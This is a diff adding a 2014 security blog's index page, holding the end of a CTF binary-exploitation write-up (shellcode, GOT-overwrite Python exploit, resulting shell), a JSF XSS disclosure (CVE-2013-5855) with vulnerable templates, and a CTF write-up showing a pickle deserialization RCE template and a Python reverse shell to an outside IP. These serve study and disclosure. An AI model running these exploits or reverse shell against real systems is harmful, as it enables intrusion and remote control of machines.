+          sprintf(buf, "%.127lg\n", d);
+          printf("%s", buf);
+        }
+        exit(0);
+}
+</code></pre>
+
+<p>This program will generate the doubles we need to send in order to place our shellcode that will look like this:</p>
+
+<pre><code class="language-lang-clike line-numbers ">gdb-peda$ x/64x $rdx  
+0x603140:   0x0000000000000010  0x0000000000000000  
+0x603150:   0x3148ff3148c03148  0x6ac0314dd23148f6  &lt;--- shellcode  
+0x603160:   0x5a066a5e016a5f02  0xc08949050f58296a  
+0x603170:   0x5241d2314df63148  0x2444c766022404c6  
+0x603180:   0xc0042444c7414102  0x106ae6894890efa8  
+0x603190:   0x0f582a6a5f50415a  0x485e036af6314805  
+0x6031a0:   0x75050f58216aceff  0x5a5e5757ff3148f6  
+0x6031b0:   0x2f6e69622f2fbf48  0x545708efc1486873  
+0x6031c0:   0x9090050f583b6a5f  0x0000909090909090  &lt;---- ending nops  
+0x6031d0:   0x0000000000000000  0x0000000000000000  
+</code></pre>
+
+<p>and my exploit:</p>
+
+<pre><code class="language-lang-python line-numbers ">import socket  
+import struct  
+import subprocess  
+import time
+
+host = "localhost"  
+port = 31415
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
+s.connect((host, port))
+
+cmd="/home/pwntester/Desktop/gits-2014/ti-1337/convert"  
+result = subprocess.check_output(cmd, shell=True)  
+lines = result.split("\n")  
+print "[+] Sending shellcode"  
+for line in lines:  
+        if line != "":
+                print "[+] Sending: " + line
+                s.send(line + '\n')
+
+print "[+] Clearing Stack"  
+s.send('c\n')  
+print "[+] Popping my way to recv@got"  
+for i in xrange(38):  
+        s.send('b\n')
+print "[+] Replacing recv@got with shellcode address"  
+s.send('2261634.5098039214499294757843017578125\n')  # 0x4141414141414141  
+time.sleep(1)  
+s.close()  
+</code></pre>
+
+<p>Executing this exploit will place 41414141414141 in the GOT entry for recv() so we should get a crash:</p>
+
+<pre><code class="language-lang-bash line-numbers ">gdb-peda$  
+Program received signal SIGSEGV, Segmentation fault.  
+[----------------------------------registers-----------------------------------]
+RAX: 0x8  
+RBX: 0x0  
+RCX: 0x0  
+RDX: 0x1  
+RSI: 0x7fffffffe29f --&gt; 0x10a  
+RDI: 0x8  
+RBP: 0x7fffffffe2b0 --&gt; 0x7fffffffe3f0 --&gt; 0x7fffffffe530 --&gt; 0x7fffffffe560 --&gt; 0x7fffffffe590 --&gt; 0x0  
+RSP: 0x7fffffffe268 --&gt; 0x401357 (mov    QWORD PTR [rbp-0x10],rax)  
+RIP: 0x400ad0 (&lt;recv@plt&gt;:  jmp    QWORD PTR [rip+0x20254a]        # 0x603020 &lt;recv@got.plt&gt;)  
+R8 : 0x0  
+R9 : 0x600000 ('')  
+R10: 0x0  
+R11: 0x7ffff7854b0d (ret)  
+R12: 0x400c90 (xor    ebp,ebp)  
+R13: 0x7fffffffe670 --&gt; 0x1  
+R14: 0x0  
+R15: 0x0  
+EFLAGS: 0x10287 (CARRY PARITY adjust zero SIGN trap INTERRUPT direction overflow)  
+0x0000000000400ad0 in recv@plt ()  
+gdb-peda$ x/1x 0x000603020  
+0x603020 &lt;recv@got.plt&gt;:    0x4141414141414141  
+</code></pre>
+
+<p>Nice, we can now overwrite the GOT entry with our shellcode address (0x0000000000603150) using this double: 3.114629356634885514212623795744696989099126200464912460920046189338858451871977588458999392410662226841627927565265440233180118e-317</p>
+
+<pre><code class="language-lang-bash line-numbers ">gdb-peda$ x/x 0x603020  
+0x603020 &lt;recv@got.plt&gt;:    0x0000000000603150  
+</code></pre>
+
+<p>We successfully owerwrite the GOT entry with the shellcode address and we get our shell back:</p>
+
+<pre><code class="language-lang-bash line-numbers ">root@dragonstone:~# nc -lvp 16705  
+nc: listening on :: 16705 ...  
+nc: listening on 0.0.0.0 16705 ...  
+nc: connect to 192.168.239.144 16705 from 192.168.239.144 (192.168.239.144) 50403 [50403]  
+pwd  
+/home/gambino
+id  
+uid=1001(gambino) gid=1000(gambino) groups=1000(gambino)  
+</code></pre>
+    </section>
+    <footer class="post-indexfooter">
+        <i class="fa fa-comments"></i> <a href="../../blog/2014/03/15/ghost-in-the-shellcode-ti-1337-pwnable/index.html#disqus_thread">Comments</a>
+    </footer>
+</article>
+
+
+<article class="post tag-jsf tag-outputtext">
+    <header class="post-header">
+        <span class="post-meta"><time datetime="2014-02-14">14 Feb 2014</time> on <a href="../../tag/jsf/">JSF</a>, <a href="../../tag/outputtext/">outputText</a></span>
+        <h1 class="post-title"><a href="../../blog/2014/02/14/lthoutputtext-gt-go-home-you-are-drunk76/">&amp;lt;h:outputText/&amp;gt; go home you are drunk!</a></h1>
+    </header>
+    <section class="post-content">
+        <p>This is just a copy of the post I wrote in the <a href="http://h30499.www3.hp.com/t5/HP-Security-Research-Blog/JSF-outputText-tag-the-good-the-bad-and-the-ugly/ba-p/6368011">HP corporate blog</a>, but just wanted to post it as well to spread the word:</p>
+
+<p>While working on a JSF (Java Server Faces) test case recently I had one of those WAT?!?! moments - where something you take for granted starts behaving in a completely different way from how you expect. In this case it was even worse, since the behavior I was observing was breaking my application security and undermining the trust I place on libraries and frameworks as a developer.</p>
+
+<h2 id="thegood">The good</h2>
+
+<p>The <a href="http://java.sun.com/jsf/html/outputText">http://java.sun.com/jsf/html/outputText</a> tag renders basic text on your JSF page. You can customize the appearance of the text using CSS styles, in which case the generated text is wrapped in an HTML &lt;span&gt; element. What developers know and trust is that by default the &lt;h:outputText&gt; tag encodes the rendered text if it contains sensitive HTML and XML characters, making it safe for an HTML context.</p>
+
+<p>The following example is XSS safe:</p>
+
+<pre><code class="language-lang-bash line-numbers ">&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"  
+    "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;
+&lt;html xmlns="http://www.w3.org/1999/xhtml"  
+      xmlns:h="http://java.sun.com/jsf/html"&gt;
+&lt;h:head /&gt;  
+&lt;body&gt;  
+&lt;h:outputText value="#{param.xss}" /&gt;  
+&lt;/body&gt;  
+&lt;/html&gt;  
+</code></pre>
+
+<h2 id="thebad">The bad</h2>
+
+<p>What is less known - and undocumented - is that within &lt;script&gt; and &lt;style&gt; blocks, &lt;h:outputText&gt; and other similar tags like &lt;h:outputLabel&gt; disable their HTML encoding, making the following example XSS vulnerable:</p>
+
+<pre><code class="language-lang-bash line-numbers ">&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"  
+    "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;
+&lt;html xmlns="http://www.w3.org/1999/xhtml"  
+      xmlns:h="http://java.sun.com/jsf/html"&gt;
+&lt;h:head /&gt;  
+&lt;body&gt;  
+&lt;script&gt;  
+  var a = &lt;h:outputText value="#{param.xss}" /&gt;;
+&lt;/script&gt;  
+&lt;/body&gt;  
+&lt;/html&gt;  
+</code></pre>
+
+<p>This can be dangerous if developers are not aware of this behavior and trust &lt;h:outputText&gt; encoding beyond its own capabilities.</p>
+
+<h2 id="theugly">The ugly</h2>
+
+<p>The HP Software Security Research Group found that &lt;h:outputText&gt; tags immediately following &lt;script&gt; or &lt;style&gt; blocks are not encoded either making the following example XSS vulnerable:</p>
+
+<pre><code class="language-lang-bash line-numbers ">&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"  
+    "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;
+&lt;html xmlns="http://www.w3.org/1999/xhtml"  
+      xmlns:h="http://java.sun.com/jsf/html"&gt;
+&lt;h:head /&gt;  
+&lt;body&gt;  
+&lt;script&gt;  
+    var a = “test”;
+&lt;/script&gt;  
+&lt;h:outputText value="#{param.xss}" /&gt;  
+&lt;/body&gt;  
+&lt;/html&gt;  
+</code></pre>
+
+<p>This bug not only applies to the &lt;h:outputText&gt; tag but also to raw EL expressions. For example:</p>
+
+<pre><code class="language-lang-bash line-numbers ">&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"  
+    "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;
+&lt;html xmlns="http://www.w3.org/1999/xhtml"  
+      xmlns:h="http://java.sun.com/jsf/html"&gt;
+&lt;h:head /&gt;  
+&lt;body&gt;  
+&lt;script&gt;  
+    var a = “test”;
+&lt;/script&gt;  
+#{param.xss}
+&lt;/body&gt;  
+&lt;/html&gt;  
+</code></pre>
+
+<p>Necessary and Sufficient Conditions For the Vulnerability to be Present:</p>
+
+<ul>
+<li>Must have an EL expression immediately after a &lt;/script&gt; element, without any intervening components or markup, and the EL expression must contain the XSS attacking code.  The presence of any intervening markup between the &lt;/script&gt; and the EL expression causes this bug to not manifest.</li>
+<li>Must be using a version of Mojarra that is subject to the vulnerability.  Any versions older than 2.2.6-SNAPSHOT and 2.1.28-SNAPSHOT are subject to the vulnerability.</li>
+</ul>
+
+<h2 id="disclosure">Disclosure</h2>
+
+<p>These issues, the lack of documentation around outputText behavior within &lt;script&gt; or &lt;style&gt; blocks and the lack of output encoding when tags follow a &lt;/script&gt; or &lt;/style&gt; end tag, have been reported to the Oracle JSF team. The fixes are due to be released in the next JSF version:</p>
+
+<p><a href="https://java.net/jira/browse/JAVASERVERFACES-3150">https://java.net/jira/browse/JAVASERVERFACES-3150</a>
+<a href="https://java.net/jira/browse/JAVASERVERFACES-3150">https://java.net/jira/browse/JAVASERVERFACES<em>SPEC</em>PUBLIC-1258</a></p>
+
+<p>We decided to disclose these issues before the release of the patched version as we understand that this disclosure does not give any advantage to attackers already testing for XSS issues. However, by providing the vulnerable patterns as soon as possible we can help developers to better protect their applications.</p>
+
+<p>CVE Id assigned is CVE-2013-5855.</p>
+
+<h2 id="workaround">Workaround</h2>
+
+<p>JSF won’t escape raw EL expressions or the &lt;h:outputText&gt; tag family within &lt;script&gt; or &lt;style&gt; blocks, so manual encoding is required if untrusted data is used in these contexts. We recommend using Javascript context encoders like the one in OWASP ESAPI</p>
+
+<p>Also, make sure you are either using a patched JSF version, or that every &lt;/script&gt; element has at least one intervening markup element present between it and the next EL expression, either embedded in the page, or on the right hand side of an attribute in a JSF UI Component Tag.</p>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>As developers we trust the libraries and frameworks we use to build our applications, and since we depend on them so strongly we don’t really have a choice. This puts the risk and responsibility on us to monitor the component projects we use and make sure we update to the latest versions when serious quality or security issues are found.</p>
+    </section>
+    <footer class="post-indexfooter">
+        <i class="fa fa-comments"></i> <a href="../../blog/2014/02/14/lthoutputtext-gt-go-home-you-are-drunk76/index.html#disqus_thread">Comments</a>
+    </footer>
+</article>
+
+
+<article class="post tag-ctf tag-web tag-olympic79">
+    <header class="post-header">
+        <span class="post-meta"><time datetime="2014-02-14">14 Feb 2014</time> on <a href="../../tag/ctf/">CTF</a>, <a href="../../tag/web/">Web</a>, <a href="../../tag/olympic79/">Olympic</a></span>
+        <h1 class="post-title"><a href="../../blog/2014/02/14/olympic-ctf-curling500-write-up/">Olympic CTF CURLing500 Write Up</a></h1>
+    </header>
+    <section class="post-content">
+        <p>We didnt have time to finish this task during the game since we decided to finish Freestyle 400 (scored in the last minute) but as I foound out later, we were close to finish it.</p>
+
+<p>In this level we were presented with a login form vulnerable to user enumeration. It was easy to see that <strong>admin</strong> was a valid user but we could not guess the password. After trying with other "normal" accounts like guest, dev and so on, we found that <strong>debug</strong> was a valid account and the password was <strong>debug</strong>. Nice, we were in.</p>
+
+<p>Then we were presented with a console to enter and run our code. Simple evaluations like "1+1" and "'some'.concat('thing')" worked. What gave us more details was entering "help":</p>
+
+<pre><code class="language-lang-javascript line-numbers ">function (x) { if (x == "mr") { print("\nSee also http://dochub.mongodb.org/core/mapreduce"); print("\nfunction mapf() {"); print(" // 'this' holds current document to inspect"); print(" emit(key, value);"); print("}"); print("\nfunction reducef(key,value_array) {"); print(" return reduced_value;"); print("}"); print("\ndb.mycollection.mapReduce(mapf, reducef[, options])"); print("\noptions"); print("{[query : &lt;query filter object&gt;]"); print(" [, sort : &lt;sort the query. useful for optimization&gt;]"); print(" [, limit : &lt;number of objects to return from collection&gt;]"); print(" [, out : &lt;output-collection name&gt;]"); print(" [, keeptemp: &lt;true|false&gt;]"); print(" [, finalize : &lt;finalizefunction&gt;]"); print(" [, scope : &lt;object where fields go into javascript global scope &gt;]"); print(" [, verbose : true]}\n"); return; } else if (x == "connect") { print("\nNormally one specifies the server on the mongo shell command line. Run mongo --help to see those options."); print("Additional connections may be opened:\n"); print(" var x = new Mongo('host[:port]');"); print(" var mydb = x.getDB('mydb');"); print(" or"); print(" var mydb = connect('host[:port]/mydb');"); print("\nNote: the REPL prompt only auto-reports getLastError() for the shell command line connection.\n"); return; } else if (x == "keys") { print("Tab completion and command history is available at the command prompt.\n"); print("Some emacs keystrokes are available too:"); print(" Ctrl-A start of line"); print(" Ctrl-E end of line"); print(" Ctrl-K del to end of line"); print("\nMulti-line commands"); print("You can enter a multi line javascript expression. If parens, braces, etc. are not closed, you will see a new line "); print("beginning with '...' characters. Type the rest of your expression. Press Ctrl-C to abort the data entry if you"); print("get stuck.\n"); } else if (x == "misc") { print("\tb = new BinData(subtype,base64str) create a BSON BinData value"); print("\tb.subtype() the BinData subtype (0..255)"); print("\tb.length() length of the BinData data in bytes"); print("\tb.hex() the data as a hex encoded string"); print("\tb.base64() the data as a base 64 encoded string"); print("\tb.toString()"); print(); print("\tb = HexData(subtype,hexstr) create a BSON BinData value from a hex string"); print("\tb = UUID(hexstr) create a BSON BinData value of UUID subtype"); print("\tb = MD5(hexstr) create a BSON BinData value of MD5 subtype"); print("\t\"hexstr\" string, sequence of hex characters (no 0x prefix)"); print(); print("\to = new ObjectId() create a new ObjectId"); print("\to.getTimestamp() return timestamp derived from first 32 bits of the OID"); print("\to.isObjectId"); print("\to.toString()"); print("\to.equals(otherid)"); print(); print("\td = ISODate() like Date() but behaves more intuitively when used"); print("\td = ISODate('YYYY-MM-DD hh:mm:ss') without an explicit \"new \" prefix on construction"); return; } else if (x == "admin") { print("\tls([path]) list files"); print("\tpwd() returns current directory"); print("\tlistFiles([path]) returns file list"); print("\thostname() returns name of this host"); print("\tcat(fname) returns contents of text file as a string"); print("\tremoveFile(f) delete a file or directory"); print("\tload(jsfilename) load and execute a .js file"); print("\trun(program[, args...]) spawn a program and wait for its completion"); print("\trunProgram(program[, args...]) same as run(), above"); print("\tsleep(m) sleep m milliseconds"); print("\tgetMemInfo() diagnostic"); return; } else if (x == "test") { print("\tstartMongodEmpty(args) DELETES DATA DIR and then starts mongod"); print("\t returns a connection to the new server"); print("\tstartMongodTest(port,dir,options)"); print("\t DELETES DATA DIR"); print("\t automatically picks port #s starting at 27000 and increasing"); print("\t or you can specify the port as the first arg"); print("\t dir is /data/db/&lt;port&gt;/ if not specified as the 2nd arg"); print("\t returns a connection to the new server"); print("\tresetDbpath(dirpathstr) deletes everything under the dir specified including subdirs"); print("\tstopMongoProgram(port[, signal])"); return; } else if (x == "") { print("\t" + "db.help() help on db methods"); print("\t" + "db.mycoll.help() help on collection methods"); print("\t" + "sh.help() sharding helpers"); print("\t" + "rs.help() replica set helpers"); print("\t" + "help admin administrative help"); print("\t" + "help connect connecting to a db help"); print("\t" + "help keys key shortcuts"); print("\t" + "help misc misc things to know"); print("\t" + "help mr mapreduce"); print(); print("\t" + "show dbs show database names"); print("\t" + "show collections show collections in current database"); print("\t" + "show users show users in current database"); print("\t" + "show profile show most recent system.profile entries with time &gt;= 1ms"); print("\t" + "show logs show the accessible logger names"); print("\t" + "show log [name] prints out the last segment of log in memory, 'global' is default"); print("\t" + "use &lt;db_name&gt; set current database"); print("\t" + "db.foo.find() list objects in collection foo"); print("\t" + "db.foo.find( { a : 1 } ) list objects in foo where a == 1"); print("\t" + "it result of the last line evaluated; use to further iterate"); print("\t" + "DBQuery.shellBatchSize = x set default number of items to display on shell"); print("\t" + "exit quit the mongo shell"); } else print("unknown help option"); }.  
+</code></pre>
+
+<p>Nice, a bunch of useful information, specially the references to <strong>MongoDB</strong>. Since it seems that we were working we Mongo, we entered the following commands:</p>
+
+<pre><code class="language-lang-javascript line-numbers ">db.getMongo().getDBNames()  
+         [u'admin', u'web500', u'local', u'flag', u'flags'].
+</code></pre>
+
+<pre><code class="language-lang-javascript line-numbers ">db.getCollectionNames()  
+         [u'lulz', u'system.indexes', u'system.users', u'users'].
+</code></pre>
+
+<pre><code class="language-lang-javascript line-numbers ">db.users.findOne()  
+         {u'login': u'debug', u'_id': ObjectId('52f661f917c6f07b4987ec03'), u'pwd': u'debug'}.
+</code></pre>
+
+<pre><code class="language-lang-javascript line-numbers ">db.users.find().toArray()  
+         [{u'login': u'debug', u'_id':  ObjectId('52f661f917c6f07b4987ec03'), u'pwd': u'debug'},
+         {u'login':  u'admin', u'_id': ObjectId('52f6623c17c6f07b4987ec04'), u'pwd':  u'firststeptoflag-done'}].
+</code></pre>
+
+<p>Pretty cool, now we have the admin credentials and can log in as administrator.</p>
+
+<p>When logged in as admin, we could see a form with two fields: a base64 encoded text and a signature to submit the base64 "command":</p>
+
+<pre><code class="language-lang-bash line-numbers ">eyJib2R5IjogImdBSjljUUVvVlFkbGVIQnBjbVZ6Y1FKT1ZRTjFkR054QTRoVkJHRnlaM054QkVzWFN5cUdjUVZWQldOb2IzSmtjUVpPVlFsallXeHNZbUZqYTNOeEIwNVZDR1Z5Y21KaFkydHpjUWhPVlFkMFlYTnJjMlYwY1FsT1ZRSnBaSEVLVlNSaE0yUTVZems0Tmkxak5EWXhMVFExWmpBdE9UTm1ZUzA1WWpCbE9USTVZVEppTXpkeEMxVUhjbVYwY21sbGMzRU1Td0JWQkhSaGMydHhEVlVOWVhCd0xuUmxjM1JmZEdGemEzRU9WUWwwYVcxbGJHbHRhWFJ4RDA1T2hsVURaWFJoY1JCT1ZRWnJkMkZ5WjNOeEVYMXhFblV1IiwgImhlYWRlcnMiOiB7fSwgImNvbnRlbnQtdHlwZSI6ICJhcHBsaWNhdGlvbi94LXB5dGhvbi1zZXJpYWxpemUiLCAicHJvcGVydGllcyI6IHsiYm9keV9lbmNvZGluZyI6ICJiYXNlNjQiLCAiY29ycmVsYXRpb25faWQiOiAiYTNkOWM5ODYtYzQ2MS00NWYwLTkzZmEtOWIwZTkyOWEyYjM3IiwgInJlcGx5X3RvIjogIjAxOTI1YTNmLTE3ZDUtM2YzYy1iMDg2LTZjNzFiZTBlMmI1MCIsICJkZWxpdmVyeV9pbmZvIjogeyJwcmlvcml0eSI6IDAsICJyb3V0aW5nX2tleSI6ICJjZWxlcnkiLCAiZXhjaGFuZ2UiOiAiY2VsZXJ5In0sICJkZWxpdmVyeV9tb2RlIjogMiwgImRlbGl2ZXJ5X3RhZyI6IDF9LCAiY29udGVudC1lbmNvZGluZyI6ICJiaW5hcnkifQ==  
+</code></pre>
+
+<pre><code class="language-lang-bash line-numbers ">9ce5b4b977d4cdd5941dfad4da1b2c9fc47a35e3a68f80e43f3ea2145c694405  
+</code></pre>
+
+<p>If we decode the command we got:</p>
+
+<pre><code class="language-lang-bash line-numbers ">{"body": "gAJ9cQEoVQdleHBpcmVzcQJOVQN1dGNxA4hVBGFyZ3NxBEsXSyqGcQVVBWNob3JkcQZOVQljYWxsYmFja3NxB05VCGVycmJhY2tzcQhOVQd0YXNrc2V0cQlOVQJpZHEKVSRhM2Q5Yzk4Ni1jNDYxLTQ1ZjAtOTNmYS05YjBlOTI5YTJiMzdxC1UHcmV0cmllc3EMSwBVBHRhc2txDVUNYXBwLnRlc3RfdGFza3EOVQl0aW1lbGltaXRxD05OhlUDZXRhcRBOVQZrd2FyZ3NxEX1xEnUu", "headers": {}, "content-type": "application/x-python-serialize", "properties": {"body_encoding": "base64", "correlation_id": "a3d9c986-c461-45f0-93fa-9b0e929a2b37", "reply_to": "01925a3f-17d5-3f3c-b086-6c71be0e2b50", "delivery_info": {"priority": 0, "routing_key": "celery", "exchange": "celery"}, "delivery_mode": 2, "delivery_tag": 1}, "content-encoding": "binary"}
+</code></pre>
+
+<p>The content-type: x-python-serialize tell us that the body is some kind of serialized python code. If we decode it:</p>
+
+<pre><code class="language-lang-bash line-numbers ">}q(UexpiresqNUutcqUargsqKK*qUchordqNU    callbacksqNUerrbacksqNUtasksetq NUidq
+U$a3d9c986-c461-45f0-93fa-9b0e929a2b37q  
+Uretriesq  
+K  
+</code></pre>
+
+<p>There was also a binary called <strong>signer-striped</strong> available for download. So it seems we can serialize our payload with pickle, sign it using the signer and submit the payload and the signature.</p>
+
+<p>The first problem is that the <strong>signer</strong> is a <strong>arm64</strong> binary:</p>
+
+<pre><code class="language-lang-bash line-numbers ">signer-striped: ELF 64-bit LSB executable, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 3.7.0, BuildID[sha1]=0xef4ad560b1f9a141560710535a904093212a8a22, stripped
+</code></pre>
+
+<p>We have to set up a chroot with qemu-arm64 to emulate the hardware and be able to run the signer. Now, lets go for the payload.</p>
+
+<p>This is as far as we got during the game since we didnt have time and decided to go for the Freestyle400 one. I tried to solve it but the CTF VMs are down so the rest is just how I think the task was solved based on the <a href="http://pastebin.com/ygn11B1p">request</a> posted by <a href="https://twitter.com/maciekkotowicz">@maciekkotowicz</a> in the IRC channel. I decided to post this entry since there are no write-ups in the web and the last part was interesting.</p>
+
+<p>The request posted in pastebin can be decoded to:</p>
+
+<pre><code class="language-lang-bash line-numbers ">{"body": "Y3R5cGVzCkZ1bmN0aW9uVHlwZQooY21hcnNoYWwKbG9hZHMKKGNiYXNlNjQKYjY0ZGVjb2RlCihTJ1l3QUFBQUFGQUFBQUF3QUFBRU1BQUFCem1BQUFBSFFBQUdRQkFJTUJBSDBBQUhRQUFHUUNBSU1CQUgwQkFIUUFBR1FEQUlNQkFIMENBSHdBQUdvQkFJTUFBSDBEQUh3REFHb0NBR1FMQUlNQkFBRjhBZ0JxQXdCOEF3QnFCQUNEQUFCa0JnQ0RBZ0FCZkFJQWFnTUFmQU1BYWdRQWd3QUFaQWNBZ3dJQUFYd0NBR29EQUh3REFHb0VBSU1BQUdRSUFJTUNBQUY4QVFCcUJRQmtDUUJrQ2dCbkFnQ0RBUUI5QkFCa0FBQlRLQXdBQUFCT2RBWUFBQUJ6YjJOclpYUjBDZ0FBQUhOMVluQnliMk5sYzNOMEFnQUFBRzl6Y3d3QUFBQTVOQzR5TXk0eU1URXVPREpwT0JBQUFHa0FBQUFBYVFFQUFBQnBBZ0FBQUhNSEFBQUFMMkpwYmk5emFITUNBQUFBTFdrb0FnQUFBSE1NQUFBQU9UUXVNak11TWpFeExqZ3lhVGdRQUFBb0JnQUFBSFFLQUFBQVgxOXBiWEJ2Y25SZlgxSUFBQUFBZEFjQUFBQmpiMjV1WldOMGRBUUFBQUJrZFhBeWRBWUFBQUJtYVd4bGJtOTBCQUFBQUdOaGJHd29CUUFBQUhRQ0FBQUFjM04wQWdBQUFITndVZ0lBQUFCMEFRQUFBSE4wQVFBQUFIQW9BQUFBQUNnQUFBQUFjd2tBQUFBdmRHMXdMM2N1Y0hsMEF3QUFBSEIzYmdRQUFBQnpFZ0FBQUFBQkRBRU1BUXdCREFBTkFSWUFGZ0FXQVE9PScKdFJ0UmNfX2J1aWx0aW5fXwpnbG9iYWxzCih0UlMnJwp0Uih0Ui4=", "headers": {}, "content-type": "application/x-python-serialize", "properties": {"body_encoding": "base64", "correlation_id": "a3d9c986-c461-45f0-93fa-9b0e929a2b37", "reply_to": "01925a3f-17d5-3f3c-b086-6c71be0e2b50", "delivery_info": {"priority": 10, "routing_key": "celery", "exchange": "celery"}, "delivery_mode": 2, "delivery_tag": 1}, "content-encoding": "binary"}
+</code></pre>
+
+<p>We can see that the server accepted the same correlation<em>id, reply</em>to and delivery_info. If we decode the body:</p>
+
+<pre><code class="language-lang-bash line-numbers ">ctypes  
+FunctionType  
+(cmarshal
+loads  
+(cbase64
+b64decode  
+(S'YwAAAAAFAAAAAwAAAEMAAABzmAAAAHQAAGQBAIMBAH0AAHQAAGQCAIMBAH0BAHQAAGQDAIMBAH0CAHwAAGoBAIMAAH0DAHwDAGoCAGQLAIMBAAF8AgBqAwB8AwBqBACDAABkBgCDAgABfAIAagMAfAMAagQAgwAAZAcAgwIAAXwCAGoDAHwDAGoEAIMAAGQIAIMCAAF8AQBqBQBkCQBkCgBnAgCDAQB9BABkAABTKAwAAABOdAYAAABzb2NrZXR0CgAAAHN1YnByb2Nlc3N0AgAAAG9zcwwAAAA5NC4yMy4yMTEuODJpOBAAAGkAAAAAaQEAAABpAgAAAHMHAAAAL2Jpbi9zaHMCAAAALWkoAgAAAHMMAAAAOTQuMjMuMjExLjgyaTgQAAAoBgAAAHQKAAAAX19pbXBvcnRfX1IAAAAAdAcAAABjb25uZWN0dAQAAABkdXAydAYAAABmaWxlbm90BAAAAGNhbGwoBQAAAHQCAAAAc3N0AgAAAHNwUgIAAAB0AQAAAHN0AQAAAHAoAAAAACgAAAAAcwkAAAAvdG1wL3cucHl0AwAAAHB3bgQAAABzEgAAAAABDAEMAQwBDAANARYAFgAWAQ=='
+tRtRc__builtin__  
+globals  
+(tRS''
+tR(tR.  
+</code></pre>
+
+<p>This is easily recognozible as pickle serialized data and actually is a know template to execute code via pickle deserialization. You can find a nice post describing how does it work <a href="http://localhost:2368/page/4/www.cs.jhu.edu/~s/musings/pickle.html">here</a>, but basically what will be execute is the python code object (got via function.func_code) encoded with base64.</p>
+
+<p>In order to generate the payload we can use the following python script:</p>
+
+<pre><code class="language-lang-python line-numbers ">import marshal  
+import base64
+
+def foo():  
+    pass # PAYLOAD HERE
+
+print """ctypes  
+FunctionType  
+(cmarshal
+loads  
+(cbase64
+b64decode  
+(S'%s'
+tRtRc__builtin__  
+globals  
+(tRS''
+tR(tR.""" % base64.b64encode(marshal.dumps(foo.func_code))  
+</code></pre>
+
+<p>We can reverse the process to figure out what was the payload used:</p>
+
+<pre><code class="language-lang-python line-numbers ">import marshal  
+import base64
+
+payload = "YwAAAAAFAAAAAwAAAEMAAABzmAAAAHQAAGQBAIMBAH0AAHQAAGQCAIMBAH0BAHQAAGQDAIMBAH0CAHwAAGoBAIMAAH0DAHwDAGoCAGQLAIMBAAF8AgBqAwB8AwBqBACDAABkBgCDAgABfAIAagMAfAMAagQAgwAAZAcAgwIAAXwCAGoDAHwDAGoEAIMAAGQIAIMCAAF8AQBqBQBkCQBkCgBnAgCDAQB9BABkAABTKAwAAABOdAYAAABzb2NrZXR0CgAAAHN1YnByb2Nlc3N0AgAAAG9zcwwAAAA5NC4yMy4yMTEuODJpOBAAAGkAAAAAaQEAAABpAgAAAHMHAAAAL2Jpbi9zaHMCAAAALWkoAgAAAHMMAAAAOTQuMjMuMjExLjgyaTgQAAAoBgAAAHQKAAAAX19pbXBvcnRfX1IAAAAAdAcAAABjb25uZWN0dAQAAABkdXAydAYAAABmaWxlbm90BAAAAGNhbGwoBQAAAHQCAAAAc3N0AgAAAHNwUgIAAAB0AQAAAHN0AQAAAHAoAAAAACgAAAAAcwkAAAAvdG1wL3cucHl0AwAAAHB3bgQAAABzEgAAAAABDAEMAQwBDAANARYAFgAWAQ=="  
+p1 = base64.b64decode(payload);  
+p2 = marshal.loads(p1);  
+print p2.co_consts  
+</code></pre>
+
+<pre><code class="language-lang-bash line-numbers ">(None, 'socket', 'subprocess', 'os', '94.23.211.82', 4152, 0, 1, 2, '/bin/sh', '-i', ('94.23.211.82', 4152))
+</code></pre>
+
+<p>This looks like a reverse shell, so we can guess the payload function was something like:</p>
+
+<pre><code class="language-lang-bash line-numbers ">def pwn():  
+    import socket,subprocess,os
+    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    s.connect(("94.23.211.821",4152))
+    os.dup2(s.fileno(),0)
+    os.dup2(s.fileno(),1)
+    os.dup2(s.fileno(),2)
+    p=subprocess.call(["/bin/sh","-i"])
+</code></pre>
+
+<p>According to <a href="https://twitter.com/maciekkotowicz/status/434804205912465409">@maciekkotowicz</a>, once you got the shell you had to look for the flag in a RedisDB, but I didnt get the chance to try that.</p>
+    </section>
+    <footer class="post-indexfooter">
+        <i class="fa fa-comments"></i> <a href="../../blog/2014/02/14/olympic-ctf-curling500-write-up/index.html#disqus_thread">Comments</a>
+    </footer>
+</article>
+
+
+<article class="post tag-post-tag">
+    <header class="post-header">
+        <span class="post-meta"><time datetime="2014-02-10">10 Feb 2014</time> on <a href="../../tag/post-tag/">post</a></span>
+        <h1 class="post-title"><a href="../../blog/2014/02/10/olympic-ctf-freestyle-400-make-similar-write-up/">Olympic CTF Freestyle 400: Make similar Write Up</a></h1>
+    </header>
+    <section class="post-content">
+        <p>In this task we were presented an audio file (similar.ogg) containg a signal that sounded like a Fax machine. Actually a Hint later published read 129 LPM (Lines per minute) so it looked like a <a href="http://en.wikipedia.org/wiki/Radiofax">RadioFax or HF Fax</a> transmission. So we could use RadioFax software to extract the image being transmitted.</p>
+
+<p>We tried different tools like MultiPSK, MIXW and SeaTTY and finally got some "clear enough" images:</p>
+
+<p><img src="../../content/images/octopress/cdb5d866d94a2e16ccc5fc757133da.png" alt=""></p>
+
+<p>and</p>
+
+<p><img src="../../content/images/octopress/692728e94a92c8ba7af7211f032818.jpg" alt=""></p>
+
+<p>We saw the contents of a file being transmitted in something that looked like UUencoding:</p>
+
+<p><img src="../../content/images/octopress/9957ab5614d5c161a5a452770de56a14.png" alt=""></p>
+
+<p>After a tedious manual OCR trying to tell the "1" and "l" apart, we came with the following text:</p>
+
+<pre><code class="language-lang-bash line-numbers ">begin 644 rfax_man  
+h5sg60BSxwp62+57aMLVTPK3i9b-t+5pGLKyPA-FxxuysvFs+BT8+o0dVsM24  
